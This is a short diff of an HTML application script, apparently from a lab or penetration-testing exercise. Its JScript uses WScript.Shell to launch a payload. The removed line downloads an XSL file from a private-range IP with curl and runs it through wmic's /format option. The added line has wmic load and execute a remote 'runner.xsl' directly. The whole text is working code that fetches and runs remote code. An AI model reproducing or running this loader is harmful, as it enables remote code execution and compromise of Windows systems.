@@ -3,7 +3,7 @@
 <script language="JScript">
 
         var shell = new ActiveXObject("WScript.Shell");
-        var amit = shell.Run('cmd.exe /c curl http://192.168.45.223/test.xsl -o C:\\Windows\\Tasks\\test.xsl && wmic process get /format:"C:\\Windows\\Tasks\\test.xsl"');
+        var amit = shell.Run("wmic process get /format:\"http://192.168.45.166/runner.xsl\"");
 </script>
 </head> 
 <body>
